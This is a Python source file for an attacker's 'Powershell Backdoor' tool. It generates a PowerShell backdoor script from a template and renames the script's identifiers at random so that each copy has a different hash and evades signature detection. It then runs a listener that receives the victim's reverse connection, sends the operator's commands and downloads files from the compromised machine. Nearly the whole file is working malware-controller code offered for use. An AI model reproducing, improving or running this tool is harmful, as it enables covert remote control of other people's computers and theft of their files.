import re
import hashlib
import argparse
import socket
import string
import random

BLOCKSIZE = 65536
READ_AMOUNT = 4096

# This is used for generating a new name for each 
# variable and function in the powershell script. 
# The script is then base64 encoded ensuring a unique hash
POWERSHELL_SCRIPT_OBJECTS: list = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computerName",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
    "content",
    "readCount"
]

format_string = lambda string: string.decode().strip("\n") if type(string) == bytes else string.strip()

generate_string = lambda string_size: ''.join(random.choice(string.ascii_letters) for i in range(string_size))

def get_sha1_file_hash(filename: str) -> str:
    """ Creates a hash based on the file content
    :param filename: Filename to read
    :return: A sha1 hash 
    """
    hasher = hashlib.sha1()
    with open(filename, 'rb') as f:
        buf = f.read(BLOCKSIZE)
        while len(buf) > 0:
            hasher.update(buf)
            buf = f.read(BLOCKSIZE)
    return hasher.hexdigest()

def get_file_content(filename: str) -> str:
    """ Gets a files content
    :param filename: Filename to read
    :return: File content as a string
    """
    try:
        with open(filename, "r") as f:
            content: str = f.read()
        return content
    except  EnvironmentError:
        return None

def get_ip_address():
    """ Fetches the users active local IP Address
    :return: IP Address as a string
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    ipaddress = sock.getsockname()[0]
    sock.close()
    return ipaddress

class Backdoor:
    def __init__(self, **kwargs) -> None:
        """ Creates the backdoor
        :param ip_address: Ip address to host the backdoor on
        :param port: Port to attach the backdoor too
        :param verbose: If true verbose printing is enabled
        :param out_file: File location to store backdoor.ps1
        """
        self.ip_address = kwargs.get("ip_address")
        self.port = kwargs.get("port")
        self.ip_tuple = (self.ip_address, self.port)
        self.verbose = kwargs.get("verbose")
        self.out_file = kwargs.get("out_file")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start_session(self):
        """ Starts the backdoor listener 
        """
        try:
            if not self.obfuscate_backdoor():
                self.print_verbose_message("Failed to encode backdoor", prefix="-")
                return False
            hash = get_sha1_file_hash(self.out_file)
            self.print_verbose_message(f"Saved backdoor {self.out_file} sha1:{hash}", prefix="*")
            self.sock.bind(self.ip_tuple)
            self.print_verbose_message(f"Starting Backdoor Listener {self.ip_address}:{self.port}", prefix="*")
        except OSError:
            exit(f"[-] Failed to bind port {self.ip_address}:{self.port}")

        while True:
            self.sock.listen(1)
            connection, address = self.sock.accept()
            self.print_verbose_message(f"Recieved connection from {address[0]}:{address[1]}", prefix="*")
            self.handle_client(connection)

    def obfuscate_backdoor(self) -> bool:
        """ obfuscates the backdoor source template.ps1
        :return: True if the backdoor was obfuscated
        """
        self.print_verbose_message(f"Encoding backdoor script", prefix="*")
        backdoor = get_file_content("template.ps1")
        if not backdoor:
            return False
        for object in POWERSHELL_SCRIPT_OBJECTS:
            string_size = random.randint(5, 24)
            new_name = generate_string(string_size)
            backdoor = re.sub(object, new_name, backdoor)
        backdoor = backdoor.replace("4444", str(self.port))
        backdoor = backdoor.replace("0.0.0.0", self.ip_address)
        # backdoor_as_base64 = base64.b64encode(backdoor.encode()).decode()
        # backdoor_script = script.replace("REPLACE", backdoor_as_base64)
        return self.save_content_to_file(backdoor.encode(), self.out_file)


    def handle_client(self, connection):
        """ Handles an active backdoor session
        :param connection: Active backdoor session
        """
        print("[*] Connected, press [enter] to start the session")
        while True:
            prompt = format_string(connection.recv(READ_AMOUNT))
            if not prompt or len(prompt) == 0:
                continue

            command = input(f"{prompt}")

            if len(command) == 0:
                command += "ls | Out-Null"

            connection.sendto(command.encode(), self.ip_tuple)
            if "get_file" in command and "--help" not in command:
                self.download_remote_file(command, connection)
                continue
            print(format_string(self.recvall(connection)))

    def download_remote_file(self, command , connection):
        """ Downloads a remote file from a backdoor session
        :param command: Command to read the file location from
        :param connection: Active backdoor session
        """
        command = command.split(" ")
        try:
            file_location = command[2]
        except KeyError:
            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
            return False
        data = self.recvall(connection)
        if self.save_content_to_file(data, file_location):
            self.print_verbose_message(f"Saved content {len(data)} to {file_location}", prefix="*")
        return True

    def recvall(self, connection):
        """ Receives all data in a socket connection
        :param connection: Connection to read data from
        :param data: Previous data parts
        """
        data: bytes = b""
        while True:
            part = connection.recv(READ_AMOUNT)
            # print(len(part))
            data += part
            if len(part) < READ_AMOUNT:
                # either 0 or end of data
                break
        return data

    def print_verbose_message(self, message: str, prefix: str = None):
        """ Prints a verbose message
        :param message: Message to print
        :param prefix: Prefix to add before message e.g - == [-] Message
        """
        if self.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def save_content_to_file(self, content: bytes, filename: str):
        """ Saves content to a local file
        :param content: Bytes to save to file 
        :param filename: Filename to save data to
        """
        try:
            if "Cannot find path '" in format_string(content):
                self.print_verbose_message(f"Error: {content} ", prefix="-")
                return
            with open(filename, "wb") as f:
                f.seek(0)
                f.write(content)
            return True
        except EnvironmentError:
            self.print_verbose_message(f"Failed to create file ({len(content)}): {filename} ", prefix="-")
            return False
            

if __name__ ==  "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor")
    parser.add_argument(
        "--ip-address",
        "-I",
        help=f"IP Address to bind to default: {get_ip_address()}", 
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port to connect over default:4444", 
        default=4444,
        type=int
    )
    parser.add_argument(
        "--out-file",
        "-O",
        help=f"Generated backdoor filename", 
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
        help=f"Show verbose output", 
        default=False,
        action="store_true"
    )
    args = parser.parse_args()
    try:
        l = Backdoor(**vars(args))
        l.start_session()
    except KeyboardInterrupt:
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        exit(f"Exiting! {e}")